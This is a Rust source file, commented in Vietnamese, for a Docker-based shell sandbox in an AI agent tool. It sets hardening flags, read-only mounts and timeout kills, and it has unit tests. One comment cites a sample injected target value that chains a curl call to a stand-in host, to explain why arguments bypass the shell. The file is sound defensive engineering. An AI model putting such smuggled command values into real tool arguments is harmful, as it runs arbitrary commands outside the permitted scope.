//! Sandbox shell (agents.md mục 15.2).
//!
//! Hai chế độ, bật tường minh qua `[security.sandbox] mode`:
//!
//! * **`docker` (mặc định)** — `docker run --rm` với: chỉ mount workspace vào
//!   `/workspace`, `--user` non-root, `--network none` khi `network = false` (mặc định),
//!   `--memory`, `--cpus`, `--pids-limit`, `--cap-drop ALL`,
//!   `--security-opt no-new-privileges`, container **có tên** (để `docker kill` khi
//!   timeout), KHÔNG truyền biến môi trường của host (không `-e`, không env-file).
//! * **`host`** — chạy `sh -c` trực tiếp trên host với cwd = workspace; **mọi lệnh là
//!   `Dangerous`** (xem [`Sandbox::base_risk`]) và phải bật tường minh trong cấu hình.
//!
//! Timeout: đua với `tokio::time::timeout`; docker mode gọi `docker kill <tên>`
//! (host mode kill tiến trình con) rồi trả [`SandboxError::Timeout`]. Output cắt ở
//! ranh giới UTF-8. I/O chặn → caller bọc `spawn_blocking` (mục 22.8).

use std::path::PathBuf;
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::Duration;

use bean_types::Risk;
use bean_types::config::{SandboxConfig, SandboxMode};
use tokio_util::sync::CancellationToken;

/// Trần ký tự mỗi stream (stdout/stderr) trước khi ghép thành output tool.
const MAX_STREAM_CHARS: usize = 10_000;

/// Biến môi trường cố định cho container **read-only** của M27 (`run_argv_readonly`).
///
/// Mục đích duy nhất: **đẩy mọi thứ runner thường ghi ra ngoài cây thư mục dự án** —
/// thư mục build của cargo, cache registry, cache bytecode của vitest, `.pytest_cache` —
/// vào `/tmp` của container (được `--rm` xoá ngay sau khi chạy). Nhờ vậy `cargo test` /
/// `vitest` / `pytest` build được và chạy được trong khi workspace mount `:ro`.
///
/// `HOME=/tmp` chặn nhiều runner ghi cache theo `$HOME`; `TMPDIR` phục vụ công cụ tạm
/// file tạm của Node/Python. `CARGO_NET_OFFLINE` **không** đặt ở đây: `cargo_test` mặc
/// định cần mạng (xem `docs/decisions.md` D17.2).
const READONLY_ENV: &[(&str, &str)] = &[
    ("CARGO_TARGET_DIR", "/tmp/target"),
    ("CARGO_HOME", "/tmp/cargo"),
    ("HOME", "/tmp"),
    ("TMPDIR", "/tmp"),
    // vitest: cache theo project root mặc định (node_modules/.vite) — ép ra /tmp.
    ("XDG_CACHE_HOME", "/tmp/cache"),
    // pytest: tắt ghi `.pytest_cache` trong workdir (đọc-only ⇒ sẽ crash nếu còn bật).
    ("PYTHONDONTWRITEBYTECODE", "1"),
];

/// Kết quả một lệnh shell.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellOutcome {
    /// Exit code (`None` = tiến trình bị kill, không có code — ví dụ timeout).
    pub exit_code: Option<i32>,
    /// stdout (đã cắt ở ranh giới UTF-8).
    pub stdout: String,
    /// stderr (đã cắt ở ranh giới UTF-8).
    pub stderr: String,
}

/// Lỗi sandbox.
#[derive(Debug, thiserror::Error)]
pub enum SandboxError {
    /// Vượt quá thời gian cho phép — container/tiến trình đã bị kill.
    #[error("lệnh vượt quá {0}s — đã bị kill")]
    Timeout(u64),
    /// Người dùng huỷ run khi lệnh đang chạy.
    #[error("lệnh bị huỷ bởi người dùng")]
    Cancelled,
    /// Không khởi động được lệnh (thiếu docker, sai image, I/O...).
    #[error("không chạy được lệnh: {0}")]
    Launch(String),
}

/// Bộ đếm tên container toàn **tiến trình** — nhiều `Sandbox` chạy song song trong
/// cùng process (test chạy song song) vẫn không trùng tên.
static CONTAINER_SEQ: AtomicU64 = AtomicU64::new(0);

/// Cấu hình sandbox + workspace.
#[derive(Debug)]
pub struct Sandbox {
    cfg: SandboxConfig,
    workspace: PathBuf,
}

impl Sandbox {
    /// Dựng sandbox cho `workspace` với cấu hình `[security.sandbox]`.
    #[must_use]
    pub fn new(cfg: SandboxConfig, workspace: PathBuf) -> Self {
        if cfg.mode == SandboxMode::Host {
            tracing::warn!(
                "sandbox mode = HOST: mọi lệnh run_shell là Dangerous và chạy trực tiếp trên máy host"
            );
        }
        Self { cfg, workspace }
    }

    /// Mức rủi ro **cơ bản** của `run_shell` theo chế độ (mục 15.2): docker ⇒ `Confirm`,
    /// host ⇒ `Dangerous` (luôn hỏi, không có "cho phép trong phiên" — mục 7.2).
    #[must_use]
    pub const fn base_risk(&self) -> Risk {
        match self.cfg.mode {
            SandboxMode::Docker => Risk::Confirm,
            SandboxMode::Host => Risk::Dangerous,
        }
    }

    /// Timeout (giây) cho một lệnh shell theo cấu hình `[security.sandbox]`.
    #[must_use]
    pub const fn timeout_seconds(&self) -> u64 {
        self.cfg.timeout_seconds
    }

    /// Tên container kế tiếp (dùng cho kill khi timeout/huỷ) — duy nhất trong tiến trình.
    fn next_container_name() -> String {
        let n = CONTAINER_SEQ.fetch_add(1, Ordering::Relaxed);
        format!("bean-sbx-{}-{n}", std::process::id())
    }

    /// Dựng argv `docker run` cho một lệnh — tách riêng để **unit-test** được mà không
    /// cần docker daemon (kiểm tra đủ cờ bảo mật, không lọt env host).
    /// Các cờ `docker run` **chung** cho mọi lệnh: cô lập, non-root, giới hạn tài nguyên.
    ///
    /// Tách khỏi [`Self::docker_run_args`] để [`Self::run_argv`] dùng lại đúng bộ cờ này mà
    /// không phải sao chép (tránh tình trạng `run_shell` có cờ an toàn mà scanner thì không).
    fn docker_run_prefix(&self, container_name: &str) -> Vec<String> {
        let mut args = self.docker_shared_flags(container_name);
        // Chỉ mount workspace — file ngoài workspace không nhìn thấy từ container.
        // KHÔNG có `:ro`: `run_shell` cần build/ghi (target/, node_modules...).
        args.push("--volume".into());
        args.push(format!("{}:/workspace", self.workspace.display()));
        args.push("--workdir".into());
        args.push("/workspace".into());
        args
    }

    /// Cờ `docker run` **không phụ thuộc cách mount** — dùng chung cho cả đường ghi được
    /// ([`Self::docker_run_prefix`]) và đường read-only ([`Self::docker_run_prefix_readonly`]).
    ///
    /// Tách riêng để "read-only" của M27 là **một** khác biệt duy nhất (`:ro` + cờ môi
    /// trường) thay vì nhân bản cả danh sách cờ bảo mật — nhân bản là cách chắc chắn nhất
    /// để từ nay `run_shell` có cờ mà `qa_test` mất (xem `run_argv_readonly`).
    fn docker_shared_flags(&self, container_name: &str) -> Vec<String> {
        let cfg = &self.cfg;
        let mut args: Vec<String> = vec![
            "run".into(),
            "--rm".into(),
            "--name".into(),
            container_name.into(),
        ];
        // non-root: uid/gid của người chạy Bean (volume ghi được, không root).
        args.push("--user".into());
        args.push(current_uid_gid());
        args.push("--memory".into());
        args.push(cfg.memory.clone());
        args.push("--cpus".into());
        args.push(format!("{}", cfg.cpus));
        args.push("--pids-limit".into());
        args.push(cfg.pids_limit.to_string());
        args.push("--cap-drop".into());
        args.push("ALL".into());
        args.push("--security-opt".into());
        args.push("no-new-privileges".into());
        if !cfg.network {
            args.push("--network".into());
            args.push("none".into());
        }
        // KHÔNG có `-e`/`--env-file`: container không nhận biến môi trường của host.
        args
    }

    /// `docker run` cho đường **read-only** (M27 — `qa_test`).
    ///
    /// Khác [`Self::docker_run_prefix` ở **đúng ba chỗ**, còn lại dùng chung
    /// [`Self::docker_shared_flags`]:
    ///
    /// 1. `--volume ws:/workspace:ro` — mount **read-only**. Đây là chốt chặn four-eyes
    ///    ở tầng code cho vai trò `qa`: kể cả `build.rs` hay test tự ghi cũng **không**
    ///    được chạm vào cây thư mục dự án, không chỉ "tay model không ghi".
    /// 2. `--workdir` trỏ vào `workdir` tương đối của suite (đã kiểm qua path jail ở
    ///    tầng `bean-qa` trước khi tới đây).
    /// 3. Cờ `-e` **tường minh, do code dựng** (không phải env host): `CARGO_TARGET_DIR`,
    ///    `CARGO_HOME`, `HOME` trỏ ra `/tmp` để build/test chạy được mà không ghi được
    ///    vào workspace. Container `--rm` nên `/tmp` bị huỷ ngay sau khi chạy.
    fn docker_run_prefix_readonly(&self, container_name: &str, workdir: &str) -> Vec<String> {
        let mut args = self.docker_shared_flags(container_name);
        args.push("--volume".into());
        args.push(format!("{}:/workspace:ro", self.workspace.display()));
        args.push("--workdir".into());
        args.push(format!("/workspace/{workdir}"));
        // Chỉ những biến dưới đây; KHÔNG có `--env-file` và không truyền env host.
        for (key, value) in READONLY_ENV {
            args.push("-e".into());
            args.push(format!("{key}={value}"));
        }
        args
    }

    fn docker_run_args(&self, container_name: &str, command: &str) -> Vec<String> {
        let mut args = self.docker_run_prefix(container_name);
        args.push(self.cfg.image.clone());
        // sh -c để thực thi chuỗi lệnh (image chuẩn có /bin/sh — Debian slim, không Node).
        args.push("sh".into());
        args.push("-c".into());
        args.push(command.to_string());
        args
    }

    /// Chạy một lệnh trong sandbox, đua với `timeout` và `cancel`.
    ///
    /// # Errors
    /// [`SandboxError`] — timeout (đã kill), huỷ, hoặc không khởi động được.
    pub async fn run(
        &self,
        command: &str,
        timeout: Duration,
        cancel: &CancellationToken,
    ) -> Result<ShellOutcome, SandboxError> {
        match self.cfg.mode {
            SandboxMode::Docker => {
                let name = Self::next_container_name();
                let args = self.docker_run_args(&name, command);
                let timeout_secs = self.cfg.timeout_seconds;
                run_docker(args, name, timeout_secs, timeout, cancel).await
            }
            SandboxMode::Host => run_host(command, self.workspace.clone(), timeout, cancel).await,
        }
    }

    /// Chạy **argv cố định** (không qua shell) trong sandbox (M23 — scanner).
    ///
    /// # Vì sao cần hàm này
    ///
    /// [`Self::run`] nhận chuỗi rồi chạy `sh -c`, nghĩa là mọi ký tự `; | & $()` trong
    /// tham số đều có ý nghĩa với shell. Với scanner đó là lỗ hổng: model chỉ cần truyền
    /// `target = "10.0.0.1; curl evil.test"` là chạy được lệnh tuỳ ý ngoài phạm vi.
    ///
    /// Ở đây argv được **code tự dựng** từ giá trị đã kiểm tra, và container `exec` trực tiếp
    /// không có shell nào để diễn giải ký tự. Target còn được đặt sau `--` để không bao giờ
    /// bị parser hiểu nhầm thành tuỳ chọn.
    ///
    /// # Errors
    /// Như [`Self::run`].
    pub async fn run_argv(
        &self,
        argv: &[String],
        timeout: Duration,
        cancel: &CancellationToken,
    ) -> Result<ShellOutcome, SandboxError> {
        if argv.is_empty() {
            return Err(SandboxError::Launch("argv rỗng".into()));
        }
        match self.cfg.mode {
            SandboxMode::Docker => {
                let name = Self::next_container_name();
                let mut args = self.docker_run_prefix(&name);
                args.push(self.cfg.image.clone());
                args.extend_from_slice(argv);
                let timeout_secs = self.cfg.timeout_seconds;
                run_docker(args, name, timeout_secs, timeout, cancel).await
            }
            SandboxMode::Host => {
                // Chế độ host: vẫn **exec trực tiếp**, không qua `sh -c` (D14.5).
                let program = argv[0].clone();
                let mut command = tokio::process::Command::new(&program);
                command.args(&argv[1..]);
                command.current_dir(&self.workspace);
                run_host_argv(command, timeout, cancel).await
            }
        }
    }

    /// Chạy **argv cố định** trong container có workspace mount **read-only** (M27 — `qa_test`).
    ///
    /// # Vì sao là hàm MỚI thay vì sửa [`Self::run_argv`]
    ///
    /// [`Self::run_argv`] mount workspace **ghi được** vì `run_shell` cần build (`target/`,
    /// `node_modules/`). Đổi chung thì `run_shell` mất khả năng build, còn hạ xuống
    /// read-only thì nó mất quyền ghi mà vai trò `developer` cần. Vì vậy đây là **đường mới**,
    /// khác đúng ba thứ: mount `:ro`, `--workdir` theo suite, và các cờ `-e` tường minh
    /// ([`READONLY_ENV`]). Toàn bộ cờ bảo mật còn lại dùng chung [`Self::docker_shared_flags`].
    ///
    /// # Điều kiện ràng buộc quyết định "cho phép trong phiên" của `qa_test`
    ///
    /// `qa_test` là tool `Confirm` **có** tuỳ chọn "cho phép trong phiên" (khác `security_scan`
    /// của M23). Đổi lại, `:ro` ở đây **phải giữ nguyên** — nó là thứ duy nhất bảo đảm vai
    /// trò `qa` không ghi được vào workspace (kể cả qua `build.rs` hay test tự ghi). Nới
    /// `:ro` thành ghi được là mất four-eyes, phải quay lại xét lại chính quyết định đó.
    ///
    /// # Panics
    ///
    /// Không panic: `workdir` rỗng trả [`SandboxError::Launch`]. Chế độ host trả lỗi tương
    /// tự vì không thể bảo đảm read-only trên host — cấu hình `validate()` đã chặn trước.
    ///
    /// # Errors
    ///
    /// Như [`Self::run_argv`]; thêm lỗi khi `argv`/`workdir` không dùng được.
    pub async fn run_argv_readonly(
        &self,
        argv: &[String],
        workdir: &str,
        timeout: Duration,
        cancel: &CancellationToken,
    ) -> Result<ShellOutcome, SandboxError> {
        if argv.is_empty() {
            return Err(SandboxError::Launch("argv rỗng".into()));
        }
        // `workdir` đã được `bean-qa` kiểm qua path jail, nhưng sandbox là tầng cuối
        // nên vẫn chặn lặp: chỉ nhận đường dẫn tương đối không có `..`/đường dẫn tuyệt đối.
        // `.` = gốc workspace (sandbox mount ở `/workspace`); chuỗi rỗng bị từ chối vì
        // `--workdir ""` sẽ làm docker báo lỗi khó hiểu thay vì nói đúng nguyên nhân.
        if workdir.is_empty()
            || workdir.starts_with('/')
            || workdir
                .split('/')
                .any(|part| part == ".." || part.is_empty())
        {
            return Err(SandboxError::Launch(format!(
                "workdir `{workdir}` không hợp lệ — phải là đường dẫn tương đối trong workspace"
            )));
        }
        match self.cfg.mode {
            SandboxMode::Docker => {
                let name = Self::next_container_name();
                let mut args = self.docker_run_prefix_readonly(&name, workdir);
                args.push(self.cfg.image.clone());
                args.extend_from_slice(argv);
                let timeout_secs = self.cfg.timeout_seconds;
                run_docker(args, name, timeout_secs, timeout, cancel).await
            }
            SandboxMode::Host => Err(SandboxError::Launch(
                "qa_test chỉ chạy được ở chế độ docker — chế độ host không bảo đảm được \
                 workspace read-only, tức là mất nguyên tắc four-eyes của vai trò qa"
                    .into(),
            )),
        }
    }
}

/// uid:gid dùng cho `--user` của container: lấy từ `id -u`/`id -g` (một lần duy nhất),
/// ép non-root — nếu không tra được hoặc đang là root ⇒ `65534:65534` (nobody).
fn current_uid_gid() -> String {
    static CACHE: std::sync::OnceLock<String> = std::sync::OnceLock::new();
    CACHE
        .get_or_init(|| {
            let id_of = |flag: &str| -> Option<String> {
                let out = std::process::Command::new("id").arg(flag).output().ok()?;
                if !out.status.success() {
                    return None;
                }
                let s = String::from_utf8_lossy(&out.stdout).trim().to_string();
                // Ép non-root: root không bao giờ được dùng cho container sandbox.
                if s.is_empty() || s == "0" {
                    None
                } else {
                    Some(s)
                }
            };
            match (id_of("-u"), id_of("-g")) {
                (Some(u), Some(g)) => format!("{u}:{g}"),
                _ => "65534:65534".to_string(),
            }
        })
        .clone()
}

/// Cắt một stream (stdout/stderr) ở `MAX_STREAM_CHARS` ký tự, đúng ranh giới UTF-8.
fn cap_stream(s: String) -> String {
    match bean_tools::truncate_chars(&s, MAX_STREAM_CHARS) {
        Some((kept, cut)) => format!("{kept}\n[đã cắt {cut} ký tự — xem thêm ở lượt sau]"),
        None => s,
    }
}

/// Kill một container theo tên — best effort (docker có thể không có daemon/container
/// đã thoát); luôn trả về để caller không treo.
async fn kill_container(name: &str) {
    let res = tokio::process::Command::new("docker")
        .arg("kill")
        .arg(name)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .kill_on_drop(true)
        .status()
        .await;
    if let Err(err) = res {
        tracing::warn!("không kill được container {name}: {err}");
    }
}

/// Guard: kill container khi bị drop mà chưa disarm — chống container mồ côi khi
/// agent loop timeout/huỷ (kill_on_drop chỉ kill được docker **client**, container
/// vẫn sống dưới daemon).
struct KillContainerGuard {
    name: String,
    armed: bool,
}

impl Drop for KillContainerGuard {
    fn drop(&mut self) {
        if !self.armed {
            return;
        }
        let name = self.name.clone();
        // Tách thread để không block runtime khi drop (docker kill ~chục ms).
        std::thread::spawn(move || {
            let _ = std::process::Command::new("docker")
                .arg("kill")
                .arg(&name)
                .stdin(std::process::Stdio::null())
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status();
        });
    }
}

/// Chạy `docker run ...` (argv đầy đủ đã dựng ở [`Sandbox::docker_run_args`]),
/// đua với timeout + cancel. Timeout/cancel ⇒ `docker kill <tên>` rồi trả lỗi.
async fn run_docker(
    args: Vec<String>,
    name: String,
    timeout_secs: u64,
    timeout: Duration,
    cancel: &CancellationToken,
) -> Result<ShellOutcome, SandboxError> {
    let child = tokio::process::Command::new("docker")
        .args(&args)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        // Huỷ future (timeout/cancel) → kill luôn tiến trình docker client.
        .kill_on_drop(true)
        .spawn()
        .map_err(|e| SandboxError::Launch(format!("không khởi động được docker: {e}")))?;

    let mut guard = KillContainerGuard {
        name: name.clone(),
        armed: true,
    };

    let result = tokio::select! {
        biased;
        _ = cancel.cancelled() => Err(SandboxError::Cancelled),
        _ = tokio::time::sleep(timeout) => Err(SandboxError::Timeout(timeout_secs)),
        res = child.wait_with_output() => {
            let output =
                res.map_err(|e| SandboxError::Launch(format!("docker run lỗi: {e}")))?;
            if !output.status.success() && output.stderr.is_empty() && output.stdout.is_empty() {
                // docker không chạy được (thiếu image/daemon...) — báo rõ cho model.
                Err(SandboxError::Launch(format!(
                    "docker exit {}: không có output — kiểm tra image sandbox đã tồn tại chưa \
                     (`docker pull <image>`)",
                    output.status.code().unwrap_or(-1),
                )))
            } else {
                Ok(ShellOutcome {
                    exit_code: output.status.code(),
                    stdout: cap_stream(String::from_utf8_lossy(&output.stdout).into_owned()),
                    stderr: cap_stream(String::from_utf8_lossy(&output.stderr).into_owned()),
                })
            }
        }
    };

    match &result {
        // Lệnh đã kết thúc (kể cả lỗi launch): container đã dừng — không cần kill.
        Ok(_) | Err(SandboxError::Launch(_)) => guard.armed = false,
        // Timeout/Cancelled: kill_container đã chạy trong branch? Không — chạy đây cho
        // cả hai nhánh (bao gồm drop-khi-outer-timeout qua guard).
        Err(SandboxError::Timeout(_)) | Err(SandboxError::Cancelled) => {
            kill_container(&name).await;
            guard.armed = false; // kill_container đã lo, tránh kill lần hai ở Drop
        }
    }
    result
}

/// Chế độ host: `sh -c <command>` với cwd = workspace. Timeout/cancel ⇒ kill tiến trình.
async fn run_host(
    command: &str,
    workspace: PathBuf,
    timeout: Duration,
    cancel: &CancellationToken,
) -> Result<ShellOutcome, SandboxError> {
    let child = tokio::process::Command::new("sh")
        .arg("-c")
        .arg(command)
        .current_dir(&workspace)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .kill_on_drop(true)
        .spawn()
        .map_err(|e| SandboxError::Launch(format!("không khởi động được sh: {e}")))?;

    tokio::select! {
        biased;
        // Huỷ future (cancel/timeout) → kill_on_drop tự kill tiến trình sh.
        _ = cancel.cancelled() => Err(SandboxError::Cancelled),
        _ = tokio::time::sleep(timeout) => Err(SandboxError::Timeout(timeout.as_secs())),
        res = child.wait_with_output() => {
            let output =
                res.map_err(|e| SandboxError::Launch(format!("sh lỗi: {e}")))?;
            Ok(ShellOutcome {
                exit_code: output.status.code(),
                stdout: cap_stream(String::from_utf8_lossy(&output.stdout).into_owned()),
                stderr: cap_stream(String::from_utf8_lossy(&output.stderr).into_owned()),
            })
        }
    }
}

/// Chế độ host, **exec trực tiếp** argv (không qua `sh -c`) — dùng cho scanner (M23, D14.5).
///
/// `command` đã được dựng sẵn ở [`Sandbox::run_argv`], nên không có tầng shell nào diễn giải
/// ký tự trong tham số.
async fn run_host_argv(
    mut command: tokio::process::Command,
    timeout: Duration,
    cancel: &CancellationToken,
) -> Result<ShellOutcome, SandboxError> {
    let child = command
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .kill_on_drop(true)
        .spawn()
        .map_err(|e| SandboxError::Launch(format!("không khởi động được scanner: {e}")))?;

    tokio::select! {
        biased;
        _ = cancel.cancelled() => Err(SandboxError::Cancelled),
        _ = tokio::time::sleep(timeout) => Err(SandboxError::Timeout(timeout.as_secs())),
        res = child.wait_with_output() => {
            let output = res.map_err(|e| SandboxError::Launch(format!("scanner lỗi: {e}")))?;
            Ok(ShellOutcome {
                exit_code: output.status.code(),
                stdout: cap_stream(String::from_utf8_lossy(&output.stdout).into_owned()),
                stderr: cap_stream(String::from_utf8_lossy(&output.stderr).into_owned()),
            })
        }
    }
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used)]
    use super::*;
    use bean_types::config::{SandboxConfig, SandboxMode};

    fn docker_args(cmd: &str) -> Vec<String> {
        let ws = tempfile::tempdir().unwrap();
        let sandbox = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Docker,
                network: false,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        // Giữ tempdir sống qua toàn bộ hàm (workspace path chỉ cần trong lúc build args).
        let args = sandbox.docker_run_args("bean-sbx-test-1", cmd);
        std::mem::forget(ws);
        args
    }

    #[test]
    fn docker_args_has_all_security_flags_and_no_env() {
        let args = docker_args("ls -la");
        let joined = args.join(" ");

        // Các cờ bắt buộc (mục 15.2).
        assert!(joined.contains("--rm"));
        assert!(joined.contains("--name bean-sbx-test-1"));
        assert!(
            joined.contains("--network none"),
            "network=false → none: {joined}"
        );
        assert!(joined.contains("--cap-drop ALL"));
        assert!(joined.contains("no-new-privileges"));
        assert!(joined.contains("--memory "));
        assert!(joined.contains("--cpus "));
        assert!(joined.contains("--pids-limit "));
        assert!(joined.contains("--user "));
        // Không truyền env host: không có -e/--env/--env-file.
        assert!(
            !joined.contains(" -e ") && !joined.contains("--env"),
            "{joined}"
        );
        assert!(!joined.contains("--env-file"), "{joined}");
        // Chỉ mount workspace (một --volume duy nhất trỏ tới path workspace).
        assert_eq!(
            args.iter()
                .filter(|a| a == &&"--volume".to_string())
                .count(),
            1
        );
        // Image + sh -c <command> là phần cuối.
        let len = args.len();
        assert_eq!(args[len - 3], "sh");
        assert_eq!(args[len - 2], "-c");
        assert_eq!(args[len - 1], "ls -la");
        // --user non-root.
        let user = args
            .iter()
            .position(|a| a == "--user")
            .map(|i| args[i + 1].clone())
            .unwrap();
        let uid = user.split(':').next().unwrap();
        assert_ne!(uid, "0", "--user phải non-root: {user}");
    }

    #[test]
    fn docker_args_network_true_omits_network_flag() {
        let ws = tempfile::tempdir().unwrap();
        let sandbox = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Docker,
                network: true,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        let args = sandbox.docker_run_args("n1", "true");
        assert!(!args.contains(&"--network".to_string()));
    }

    /// M27: đường read-only mount workspace bằng `:ro` và ép mọi thư mục cache ra `/tmp`.
    ///
    /// Không cần docker daemon — chỉ kiểm argv dựng ra, đúng cách test `docker_run_args`.
    #[test]
    fn readonly_args_mount_workspace_read_only_and_point_caches_outside() {
        let ws = tempfile::tempdir().unwrap();
        let sandbox = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Docker,
                network: false,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        let args = sandbox.docker_run_prefix_readonly("n-ro", "web");
        // Lưu path trước rồi `forget` (giữ thư mục tạm sống suốt hàm như các test khác).
        let workspace_path = ws.path().to_path_buf();
        std::mem::forget(ws);
        let joined = args.join(" ");

        // (1) Read-only là bảo đảm four-eyes ở tầng code cho vai trò qa (M27).
        assert!(
            joined.contains(&format!("{}:/workspace:ro", workspace_path.display())),
            "phải mount :ro — {joined}"
        );
        // (2) workdir tương đối, không thoát khỏi /workspace.
        assert!(joined.contains("--workdir /workspace/web"), "{joined}");
        // (3) Cache/build dir ra ngoài workspace.
        for (key, value) in READONLY_ENV {
            assert!(
                joined.contains(&format!("{key}={value}")),
                "{key} — {joined}"
            );
        }
        // Không mất bất kỳ cờ bảo mật nào của đường ghi được.
        for flag in [
            "--rm",
            "--cap-drop",
            "no-new-privileges",
            "--memory",
            "--cpus",
            "--pids-limit",
            "--user",
            "--network none",
        ] {
            assert!(joined.contains(flag), "thiếu cờ {flag} — {joined}");
        }
        // Vẫn KHÔNG truyền env host: chỉ đúng các cặp `-e` tường minh ở trên.
        assert!(!joined.contains("--env-file"), "{joined}");
        let env_flags = args.windows(2).filter(|pair| pair[0] == "-e").count();
        assert_eq!(
            env_flags,
            READONLY_ENV.len(),
            "chỉ được truyền {} biến tường minh, không lọt biến host: {joined}",
            READONLY_ENV.len()
        );
    }

    /// M27: đường read-only phải giữ nguyên mọi cờ an toàn mà `run_shell` đang có.
    ///
    /// Chống hồi quy âm thầm: nếu sau này ai đó sửa `docker_shared_flags` và làm rơi một
    /// cờ, container của `qa_test` sẽ kế thừa cả lỗ hổng đó.
    #[test]
    fn readonly_args_keep_exactly_the_same_security_flags_as_writable_path() {
        let ws = tempfile::tempdir().unwrap();
        let sandbox = Sandbox::new(SandboxConfig::default(), ws.path().to_path_buf());
        let writable = sandbox.docker_run_prefix("n-w");
        let readonly = sandbox.docker_run_prefix_readonly("n-r", ".");
        std::mem::forget(ws);

        // Lọc bỏ những cờ **cố ý khác** (tên container, mount, workdir, env) rồi so phần
        // còn lại phải giống hệt nhau — cùng một nguồn sự thật `docker_shared_flags`.
        let strip = |args: &[String]| -> Vec<String> {
            let mut out: Vec<String> = Vec::new();
            let mut skip = 0usize;
            let mut after_name = false;
            for arg in args {
                if skip > 0 {
                    skip -= 1;
                    continue;
                }
                match arg.as_str() {
                    "--name" => {
                        after_name = true;
                        skip = 1;
                    }
                    "--volume" | "--workdir" | "-e" => skip = 1,
                    // Giá trị đứng ngay sau `--name` là tên container, không phải cờ.
                    _ if after_name => {
                        after_name = false;
                    }
                    _ => out.push(arg.clone()),
                }
            }
            out
        };
        assert_eq!(
            strip(&writable),
            strip(&readonly),
            "phần cờ bảo mật phải giống hệt — chỉ khác tên container/mount/workdir/env"
        );
    }

    #[test]
    fn base_risk_follows_mode() {
        let ws = tempfile::tempdir().unwrap();
        let docker = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Docker,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        let host = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Host,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        assert_eq!(docker.base_risk(), Risk::Confirm);
        assert_eq!(host.base_risk(), Risk::Dangerous);
    }

    #[tokio::test]
    async fn host_mode_runs_and_captures_output() {
        let ws = tempfile::tempdir().unwrap();
        std::fs::write(ws.path().join("in.txt"), "có file").unwrap();
        let sandbox = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Host,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        let cancel = CancellationToken::new();
        let out = sandbox
            .run(
                "echo xin-chào && ls in.txt",
                Duration::from_secs(5),
                &cancel,
            )
            .await
            .unwrap();
        assert_eq!(out.exit_code, Some(0));
        assert!(out.stdout.contains("xin-chào"));
        assert!(out.stdout.contains("in.txt"));
        // Exit code khác 0 được trả đúng (không phải lỗi sandbox).
        let fail = sandbox
            .run("exit 3", Duration::from_secs(5), &cancel)
            .await
            .unwrap();
        assert_eq!(fail.exit_code, Some(3));
    }

    #[tokio::test]
    async fn host_mode_timeout_kills_process() {
        let ws = tempfile::tempdir().unwrap();
        let sandbox = Sandbox::new(
            SandboxConfig {
                mode: SandboxMode::Host,
                timeout_seconds: 2,
                ..SandboxConfig::default()
            },
            ws.path().to_path_buf(),
        );
        let cancel = CancellationToken::new();
        let started = std::time::Instant::now();
        let err = sandbox
            .run("sleep 30", Duration::from_secs(1), &cancel)
            .await
            .unwrap_err();
        assert!(matches!(err, SandboxError::Timeout(_)), "{err:?}");
        // Trở về nhanh (không đợi hết 30s) — có dư địa cho kill.
        assert!(started.elapsed() < Duration::from_secs(5));
    }

    #[tokio::test]
    async fn cap_stream_cuts_on_utf8_boundary() {
        let long = "Tiếng Việt 🦀 ".repeat(5000);
        let capped = cap_stream(long.clone());
        assert!(capped.chars().count() < long.chars().count());
        assert!(capped.contains("đã cắt"));
        assert!(!capped.contains('\u{FFFD}'));
    }
}
